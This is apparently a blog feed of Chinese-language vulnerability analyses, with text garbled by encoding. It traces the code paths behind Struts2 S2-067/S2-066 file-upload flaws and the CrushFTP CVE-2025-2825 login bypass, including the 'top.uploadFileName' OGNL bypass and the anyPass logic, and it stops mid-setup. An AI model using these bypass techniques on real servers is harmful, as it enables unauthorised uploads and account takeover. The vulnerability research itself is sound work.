<h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><p><code>S2-067</code>ä¸<code>S2-066</code>æœ‰90%çš„ç›¸ä¼¼ï¼Œ<code>S2-067</code>æ˜¯<code>S2-066</code>è¡¥ä¸çš„ç»•è¿‡ã€‚<br>é€šè¿‡å‰ä¸€ç¯‡æ–‡ç« çš„åˆ†ææˆ‘ä»¬ç›´åˆ°<code>S2-066</code>çš„ä¿®å¤æ˜¯åœ¨å‘<code>ActionContext</code>çš„<code>parameters</code>å±æ€§æ·»åŠ ä¸€ä¸ªå‚æ•°ï¼Œå…ˆæ£€æŸ¥<code>parameters</code>å±æ€§æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™ç›´æ¥æ·»åŠ å‚æ•°ï¼Œ<br>å¦‚æœ<code>parameters</code>ä¸ä¸ºç©ºï¼Œåˆ™éå†æ–‡ä»¶ä¸Šä¼ çš„å‚æ•°<code>ContentType</code>ä¸<code>UploadFileName</code>ç­‰ï¼Œå°†å…¶å…ˆåŒæ„è½¬æ¢ä¸ºå°å†™ï¼Œç„¶ååœ¨ä¸<code>parameters</code>ä¸­çš„å…ƒç´ æ¯”è¾ƒï¼Œ<br>å½“å­˜åœ¨ç›¸åŒçš„å…ƒç´ çš„æ—¶å€™å…ˆåˆ é™¤<code>parameters</code>ä¸­çš„å‚æ•°å†å°†æ–°çš„å‚æ•°æ·»åŠ åˆ°<code>parameters</code>ä¸­ï¼Œè¿™æ ·å°±é¿å…äº†ç”¨æˆ·ä¸Šä¼ è¡¨å•ä¸­éæ–‡ä»¶å‚æ•°å¯¹æ–‡ä»¶ä¸Šä¼ å‚æ•°çš„å½±å“è¦†ç›–ã€‚<br>é€šè¿‡å¯¹<code>S2-066</code>çš„å­¦ä¹ æˆ‘ä»¬è¿˜å¯ä»¥ç›´åˆ°ï¼Œformè¡¨å•å‚æ•°çš„<code>name</code>å±æ€§çš„å€¼ä¼šè¢«å½“ä½œ<code>OGNL</code>è§£æï¼Œç”¨æ¥å‘<code>ValueStack</code>ä¸Šçš„<code>root</code>æ˜ å°„ä¸­çš„å…ƒç´ è®¾ç½®å±æ€§å€¼ã€‚<br>æ—¢å¦‚æ­¤ï¼Œ<code>name</code>å±æ€§çš„å€¼å°±å¯ä»¥æ˜¯ä»»ä½•æœ‰æ•ˆçš„<code>OGNL</code>è¡¨è¾¾å¼ï¼Œä»è€Œå®ç°ä»»æ„å±æ€§çš„è®¾ç½®ã€‚<br>å½“æˆ‘ä»¬ä½¿ç”¨è¿™æ ·çš„è¡¨è¾¾æ˜¯çš„æ—¶å€™<code>top.uploadFileName</code>ä¼šå‘ç”Ÿä»€ä¹ˆã€‚<br>è®©æˆ‘ä»¬å®šä½åˆ°<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters</code>æ–¹æ³•<br>è¿™é‡Œé¢è°ƒç”¨äº†<code>ValueStack</code>çš„<code>setParameter</code>æ–¹æ³•å‘<code>ValueStack</code>çš„<code>root</code>æ˜ å°„ä¸­è®¾ç½®å±æ€§å€¼ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setParameters</span><span class="params">(<span class="keyword">final</span> Object action, ValueStack stack, HttpParameters parameters)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Parameter&gt; entry : acceptableParameters.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Parameter</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                newStack.setParameter(name, value.getObject()); <span class="comment">// name == top.uploadFileName</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (devMode) &#123;</span><br><span class="line">                    notifyDeveloperParameterException(action, name, e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡<code>setParaameters</code>çš„æ–¹æ³•ç­¾åä¹Ÿå¯ä»¥çœ‹å‡ºæ¥å…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª<code>OGNL</code>è¡¨è¾¾å¼ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParameter</span><span class="params">(String expr, Object value)</span> &#123;</span><br><span class="line">        setValue(expr, value, devMode);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>ç¨‹åºç»§ç»­å‘ä¸‹æ‰§è¡Œæœ€ç»ˆä¼šæ¥åˆ° <code>com.opensymphony.xwork2.ognl.OgnlUtil.compileAndExecute</code>æ–¹æ³•ã€‚<br>è¿™ä¸ªæ–¹æ³•ä¼šæ ¹æ®<code>ognl</code>è¡¨è¾¾å¼æ¥è·å–<code>ognl</code>è¡¨è¾¾å¼å¯¹åº”çš„<code>ognl</code>æ ‘ï¼Œç„¶åè§£æ<code>ognl</code>æ ‘ã€‚<br>å½“<code>ognl</code>è¡¨è¾¾å¼ä¸º<code>uploadFileName</code>çš„æ—¶å€™ï¼Œå¾—åˆ°çš„<code>tree</code>ä¸º<code>ASTProperty</code>ç±»å‹ï¼Œ<code>S2-066</code>å°±æ˜¯æ‰§è¡Œ<code>ASTProperty</code>çš„<code>setValueBody</code>æ–¹æ³•è®¾ç½®<code>ValueStack</code> çš„<code>root</code>æ˜ å°„ä¸­çš„å…ƒç´ ã€‚<br>å½“<code>ognl</code>è¡¨è¾¾å¼ä¸º<code>top.uploadFileName</code>çš„æ—¶å€™ï¼Œå¾—åˆ°çš„<code>tree</code>ä¸º<code>ASTChain</code>ç±»å‹ï¼Œ<code>S2-067</code>å°±æ˜¯æ‰§è¡Œ<code>ASTChain</code>çš„<code>setValueBody</code>æ–¹æ³•è®¾ç½®<code>ValueStack</code> çš„<code>root</code>æ˜ å°„ä¸­çš„å…ƒç´ ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> &lt;T&gt; Object <span class="title function_">compileAndExecute</span><span class="params">(String expression, Map&lt;String, Object&gt; context, OgnlTask&lt;T&gt; task)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        Object tree;</span><br><span class="line">        <span class="keyword">if</span> (enableExpressionCache) &#123;</span><br><span class="line">            tree = expressions.get(expression);</span><br><span class="line">            <span class="keyword">if</span> (tree == <span class="literal">null</span>) &#123;</span><br><span class="line">                tree = Ognl.parseExpression(expression);</span><br><span class="line">                checkEnableEvalExpression(tree, context);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tree = Ognl.parseExpression(expression);</span><br><span class="line">            checkEnableEvalExpression(tree, context);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">T</span> <span class="variable">exec</span> <span class="operator">=</span> task.execute(tree);</span><br><span class="line">        <span class="comment">// if cache is enabled and it&#x27;s a valid expression, puts it in</span></span><br><span class="line">        <span class="keyword">if</span> (enableExpressionCache) &#123;</span><br><span class="line">            expressions.putIfAbsent(expression, tree);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> exec;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>ASTChain</code>çš„<code>setValueBody</code>æ–¹æ³•    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setValueBody</span><span class="params">(OgnlContext context, Object target, Object value)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">handled</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">ilast</span> <span class="operator">=</span> <span class="built_in">this</span>._children.length - <span class="number">2</span>; i &lt;= ilast; ++i) &#123;</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!handled) &#123;</span><br><span class="line">                target = <span class="built_in">this</span>._children[i].getValue(context, target);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!handled) &#123;</span><br><span class="line">            <span class="built_in">this</span>._children[<span class="built_in">this</span>._children.length - <span class="number">1</span>].setValue(context, target, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>ASTChain</code>çš„<code>Children</code>åŒ…å«ä¸¤ä¸ªå…ƒç´ å‡ä¸º<code>ASTProperty</code>ç±»å‹ï¼Œå°±æ˜¯é€šè¿‡<code>.</code>å°†<code>top.uploadFileName</code>è¿›è¡Œäº†åˆ†å‰²æˆä¸¤éƒ¨åˆ†ã€‚<br>é¦–å…ˆé€šè¿‡<code>top</code>èŠ‚ç‚¹å»å–<code>target</code>çš„å€¼ï¼Œæ³¨æ„è¿™é‡Œ<code>target</code>ä¹‹å‰æ˜¯æœ‰å€¼çš„å°±æ˜¯<code>ValueStack</code>çš„<code>root</code>æ˜ å°„éƒ¨åˆ†ï¼Œå³ä¸€ä¸ª<code>CompoundRoot</code>å¯¹è±¡ï¼ŒåŒ…å«ä¸¤ä¸ªå…ƒç´ <br><code>UploadAction</code>ä»¥åŠ<code>DefaultTextProvider</code>å¯¹è±¡ã€‚è¿™é‡Œä¹Ÿå°±æ˜¯é€šè¿‡<code>top</code>èŠ‚ç‚¹å–å–ä¸€ä¸ªå€¼æ¥è¦†ç›–åŸæ¥çš„<code>target</code>ã€‚<br><img src="/archives/60a726cc/img.png" alt="img.png"><br>ä»£ç ç»§ç»­å‘ä¸‹æ‰§è¡Œä¼šæ¥åˆ°<code>com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor.getProperty</code>æ–¹æ³•ã€‚<br>è¿™é‡Œåˆ¤æ–­<code>name</code>æ˜¯å¦ä¸º<code>top</code>ï¼Œå¦‚æœä¸º<code>top</code>åˆ™è¿”å›<code>root</code>çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¦åˆ™ä¼šéå†<code>root</code>ä¸­çš„å…ƒç´ ï¼Œå¦‚æœå…ƒç´ ä¸­æœ‰<code>name</code>å±æ€§åˆ™è¿”å›è¯¥å…ƒç´ ã€‚<br><code>root</code>çš„ç¬¬ä¸€ä¸ªå…ƒç´ å³ä¸º<code>UploadAction</code>ï¼Œå³ä¸Šä¸€æ­¥æ±‚çš„<code>target</code>ä¸º<code>UploadAction</code>ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getProperty</span><span class="params">(Map context, Object target, Object name)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="type">CompoundRoot</span> <span class="variable">root</span> <span class="operator">=</span> (CompoundRoot) target;</span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">ognlContext</span> <span class="operator">=</span> (OgnlContext) context;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (name <span class="keyword">instanceof</span> Integer) &#123;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">index</span> <span class="operator">=</span> (Integer) name;</span><br><span class="line">            <span class="keyword">return</span> root.cutStack(index);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;top&quot;</span>.equals(name)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (root.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> root.get(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Object o : root) &#123;</span><br><span class="line">                <span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((OgnlRuntime.hasGetProperty(ognlContext, o, name)) || ((o <span class="keyword">instanceof</span> Map) &amp;&amp; ((Map) o).containsKey(name))) &#123;</span><br><span class="line">                        <span class="keyword">return</span> OgnlRuntime.getProperty(ognlContext, o, name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (OgnlException e) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getReason() != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Caught an Ognl exception while getting property &quot;</span> + name;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">XWorkException</span>(msg, e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IntrospectionException e) &#123;</span><br><span class="line">                    <span class="comment">// this is OK if this happens, we&#x27;ll just keep trying the next</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//property was not found</span></span><br><span class="line">            <span class="keyword">if</span> (context.containsKey(OgnlValueStack.THROW_EXCEPTION_ON_FAILURE))</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchPropertyException</span>(target, name);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é‡æ–°æ±‚å¾—<code>target</code>ååˆ™ä¼šè°ƒç”¨<code>uploadFileName</code>çš„èŠ‚ç‚¹å¾—<code>setValue</code>æ–¹æ³•ä¸º<code>target</code>è®¾ç½®å€¼ã€‚<br><code>uploadFileName</code>èŠ‚ç‚¹æ˜¯<code>ASTProperty</code>ç±»å‹ï¼Œè¿™å°±æ˜¯å…¸å‹å¾—<code>OGNL</code>è¡¨è¾¾å¼çš„è¯­æ³•äº†ï¼Œåé¢çš„å†…å®¹å°±ä¸<code>S2-066</code>çš„é€»è¾‘ä¸€è‡´äº†ã€‚<br>å› ä¸ºåœ¨<code>S2-067</code>ä¸­æˆ‘ä»¬ä½¿ç”¨çš„<code>payload</code>æ˜¯<code>top.uploadFileName</code>ä¸<code>UploadFileName</code>åœ¨ç»Ÿä¸€å¤§å°å†™åä¹Ÿå¹¶ä¸ç›¸ç­‰ï¼Œæ‰€ä»¥å°±èƒ½å®Œç¾çš„ç»•è¿‡<code>S2-066</code>æ·»åŠ çš„<code>remove</code>æ–¹æ³•çš„è¡¥ä¸äº†ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>._children[<span class="built_in">this</span>._children.length - <span class="number">1</span>].setValue(context, target, value);</span><br></pre></td></tr></table></figure>
<p>å¦å¤–ï¼Œ<code>ValueStack</code>çš„<code>root</code>æ˜ å°„ä¸­åŒ…å«ä¸¤ä¸ªå…ƒç´ ï¼Œä¸€ä¸ªæ˜¯<code>UploadAction</code>ï¼Œä¸€ä¸ªæ˜¯<code>DefaultTextProvider</code>ï¼Œæ—¢ç„¶<code>UploadAction</code>çš„å±æ€§å¯ä»¥è¢«è®¾ç½®ï¼Œé‚£ä¹ˆ<code>DefaultTextProvider</code>çš„å±æ€§ä¹Ÿæ˜¯å¯ä»¥è¢«è®¾ç½®çš„ã€‚<br>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶<code>DefaultTextProvider</code>å¯¹è±¡çš„å±æ€§å€¼ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥åšäº›ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><p>æ–°å¢äº†ä¸€ä¸ªç±»å¹¶è¢«æ¨èä½¿ç”¨ã€‚ã€‚ã€‚ã€‚FileUploadActionå¹¶æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œåº”è¯¥æ˜¯è¿™æ ·çš„ã€‚èµ¶æ—¶é—´</p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p>æ— </p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>Apache Struts2</tag>
        <tag>ä»»æ„æ–‡ä»¶ä¸Šä¼ </tag>
        <tag>s2-067</tag>
        <tag>CVE-2024-53677</tag>
      </tags>
  </entry>
  <entry>
    <title>CrushFTP è®¤è¯ç»•è¿‡ï¼ˆCVE-2025-2825ï¼‰</title>
    <url>/archives/f9ff5c36.html</url>
    <content><![CDATA[<h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><p>åœ¨<code>crushftp.server.ServerSessionHTTP.handle_http_requests</code>æ–¹æ³•ä¸­å¯¹ç”¨æˆ·åæœ‰ç‰¹æ®Šå¤„ç†ã€‚<br>å½“ç”¨æˆ·åä¸­ä¸åŒ…å«<code>~</code>çš„æ—¶å€™ <code>lookup_user_pass</code>çš„å€¼ä¸º<code>true</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">lookup_user_pass</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">if</span> (s3_username.indexOf(<span class="string">&quot;~&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    user_pass = s3_username.substring(s3_username.indexOf(<span class="string">&quot;~&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">                    user_name = s3_username.substring(<span class="number">0</span>, s3_username.indexOf(<span class="string">&quot;~&quot;</span>));</span><br><span class="line">                    lookup_user_pass = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
<p>åé¢åœ¨è°ƒç”¨ <code>login_user_pass</code> æ–¹æ³•çš„æ—¶å€™ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯<code>lookup_user_pass</code>  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.thisSession.login_user_pass(lookup_user_pass, <span class="literal">false</span>, user_name, user_pass))</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p><code>login_user_pass</code>æ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>crushftp.handlers.UserTools.verify_user(crushftp.server.ServerStatus, java.lang.String, java.lang.String, java.lang.String, crushftp.handlers.SessionCrush, int, java.lang.String, int, java.util.Properties, java.util.Properties, boolean)</code>æ–¹æ³•<br>å½“<code>anyPass</code>ä¸º<code>true</code>çš„æ—¶å€™åªæ¯”è¾ƒäº†ç”¨æˆ·åæ˜¯å¦ç›¸ç­‰å°±ç›´æ¥è¿”å›äº†<code>user</code>å¯¹è±¡æ²¡æœ‰å¯¹å¯†ç è¿›è¡ŒéªŒè¯  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Properties <span class="title function_">verify_user</span><span class="params">(ServerStatus server_status_frame, String the_user, String the_password, String serverGroup, SessionCrush thisSession, <span class="type">int</span> user_number, String user_ip, <span class="type">int</span> user_port, Properties server_item, Properties loginReason, <span class="type">boolean</span> anyPass)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (the_user.indexOf(<span class="string">&quot;\\&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">           the_user = the_user.substring(the_user.indexOf(<span class="string">&quot;\\&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!the_password.startsWith(<span class="string">&quot;SHA:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;SHA512:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;SHA256:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;SHA3:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;MD5:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;MD5S2:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;CRYPT3:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;BCRYPT:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;MD5CRYPT:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;PBKDF2SHA256:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;SHA512CRYPT:&quot;</span>) &amp;&amp; !the_password.startsWith(<span class="string">&quot;ARGOND:&quot;</span>)) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">the_password2</span> <span class="operator">=</span> Common.url_decode(the_password);</span><br><span class="line">           <span class="keyword">if</span> (!the_password2.startsWith(<span class="string">&quot;SHA:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;SHA512:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;SHA256:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;SHA3:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;MD5:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;MD5S2:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;CRYPT3:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;BCRYPT:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;MD5CRYPT:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;PBKDF2SHA256:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;SHA512CRYPT:&quot;</span>) &amp;&amp; !the_password2.startsWith(<span class="string">&quot;ARGOND:&quot;</span>)) &#123;</span><br><span class="line">               <span class="type">Properties</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">               Log.log(<span class="string">&quot;USER_OBJ&quot;</span>, <span class="number">2</span>, <span class="string">&quot;Validating user &quot;</span> + the_user + <span class="string">&quot; with password &quot;</span> + (the_password != <span class="literal">null</span> &amp;&amp; !the_password.equals(<span class="string">&quot;&quot;</span>)) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">               <span class="keyword">if</span> (!ServerStatus.BG(<span class="string">&quot;blank_passwords&quot;</span>) &amp;&amp; the_password.trim().equals(<span class="string">&quot;&quot;</span>) &amp;&amp; !anyPass &amp;&amp; !the_user.equalsIgnoreCase(<span class="string">&quot;ANONYMOUS&quot;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                       user = ut.getUser(serverGroup, the_user, <span class="literal">true</span>);</span><br><span class="line">                   &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">                       Log.log(<span class="string">&quot;USER_OBJ&quot;</span>, <span class="number">2</span>, var23);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                   Log.log(<span class="string">&quot;USER_OBJ&quot;</span>, <span class="number">1</span>, <span class="string">&quot;Validating user &quot;</span> + the_user + <span class="string">&quot; with local user file:&quot;</span> + (user != <span class="literal">null</span> ? String.valueOf(user.size()) : <span class="string">&quot;no user.XML found!&quot;</span>));</span><br><span class="line">                   <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">                       loginReason.put(<span class="string">&quot;reason&quot;</span>, <span class="string">&quot;valid user&quot;</span>);</span><br><span class="line">                       <span class="type">ServerStatus</span> <span class="variable">var10000</span> <span class="operator">=</span> ServerStatus.thisObj;</span><br><span class="line">                       <span class="keyword">if</span> (ServerStatus.BG(<span class="string">&quot;secondary_login_via_email&quot;</span>) &amp;&amp; the_user.indexOf(<span class="string">&quot;@&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; user.getProperty(<span class="string">&quot;username&quot;</span>).indexOf(<span class="string">&quot;@&quot;</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                           the_user = user.getProperty(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> (anyPass &amp;&amp; user.getProperty(<span class="string">&quot;username&quot;</span>).equalsIgnoreCase(the_user)) &#123;</span><br><span class="line">                           <span class="keyword">return</span> user;</span><br><span class="line">                       &#125;</span><br></pre></td></tr></table></figure>
<h1 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h1><p>ä¿®æ”¹äº†<code>this.thisSession.login_user_pass(false, false, user_name, user_pass))</code>çš„è°ƒç”¨é€»è¾‘ï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°è¢«å›ºå®šè®¾ç½®ä¸º<code>false</code>  </p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>è®¤è¯ç»•è¿‡</tag>
        <tag>CrushFTP</tag>
        <tag>CVE-2025-2825</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Struts2 S2-066 ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2023-50164ï¼‰</title>
    <url>/archives/fe8a0a5d.html</url>
    <content><![CDATA[<h1 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h1><p>ç”±äºæ–‡ä»¶ä¸Šä¼ é€»è¾‘å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥æ“çºµæ–‡ä»¶ä¸Šä¼ å‚æ•°æ¥å®ç°è·¯å¾„ç©¿è¶Šï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶å¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚  </p>
<h1 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h1><p>2.5.0 &lt;&#x3D; Apache Struts &lt;&#x3D; 2.5.32<br>6.0.0 &lt;&#x3D; Apache Struts &lt;&#x3D; 6.3.0</p>
<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä½¿ç”¨ideaåˆ›å»ºä¸€ä¸ªmaven-webé¡¹ç›®ï¼Œä¿®æ”¹pom.xmlæ–‡ä»¶æ·»åŠ ä¾èµ–</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- Struts2 æ ¸å¿ƒåº“ --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        